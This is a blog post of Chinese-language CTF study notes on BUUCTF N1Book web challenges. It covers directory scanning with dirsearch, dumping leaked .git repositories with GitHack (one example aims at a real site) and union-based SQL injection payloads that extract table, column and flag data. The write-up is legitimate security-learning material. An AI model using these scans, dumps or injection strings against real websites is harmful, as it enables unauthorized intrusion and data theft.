---
title: "N1Book Web 学习"
date: 2021-12-28T00:17:37+08:00
draft: false
tags: ['ctf', 'web']
categories: ['learning']
---

[[https://buuoj.cn/challenges][buuctf]] n1book web刷题
* 信息收集
** 常见的收集
网站上可能会有敏感目录/文件导致信息泄漏，如.git，vim的备份文件.swp等。可以用[[https://github.com/maurosoria/dirsearch][dirsearch]]扫描站点目录。

#+begin_src shell
cd dirsearch
python3 dirsearch.py -u 192.168.21.128 -e php
#+end_src

- -u 指定目标ip
- -e 指定网站语言
- -w 可以加上自己的字典（带上路径）
- –random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）

脚本扫描的数据库在 =db= 文件夹，可以自己加。这题的目标文件有三个： =robots.txt= , =index.php~= , =.index.php.swp= 。我一开始扫了2次没扫出来，指定了php语言后扫出了robots.txt。

robots.txt是网站定的允许爬虫规则；后缀为~的是gedit的备份文件；.文件名.swp是vim的备份文件。

** 粗心的小李
git泄漏题可以用的工具有[[https://github.com/lijiejie/githack][GitHack]]，[[https://github.com/denny0223/scrabble][scrabble]]。只要目标网站上有.git，运行脚本就能把网站dump下来。

#+begin_src shell
GitHack.py http://www.openssl.org/.git/
#+end_src

#+begin_Src shell
scrabble http://example.com/
#+end_src
* SQL注入
- 数字型注入
  若输入参数为1，查询的语句为 =select * from table where id=1= 。若输入参数为1+1返回2的结果，基本能确定是数字型输入。
  参数前后没有过滤也没有引号，可以直接union。

- 字符型注入
  在输入参数前后加了引号。若输入参数为1，查询语句为 =select * from table where id = '1'= 。可以通过补全引号后在后面加union，在最后加上#或者--+注释掉之后的内容。

** SQL注入-1
先测试一下，发现只有id=1, 2, 3的时候有内容。id=3的时候提示有后门参数tips，tips=1会显示出执行的sql语句。

[[/img/2021-12-29_sql1-tips.png]]

可以看出是字符形式的注入。执行 =select * from notes where id ='-1' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()#'= 获取表名，查到有个表 =fl4g= 。要注意select出来的个数必须为3，直接 =select *= 查不到东西。应该是后台过滤了参数必须为3个，并且只有后面两个会显示，所以查出来的 =table_name= 也要用 =group_concat= 合并为一个字段。拿到表名后执行 =select * from notes where id ='4' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'fl4g' #'= 获取到列名为fllllag。最后执行 =select * from notes where id = '4' union select 1,2,fllllag from fl4g= 就能获取flag。
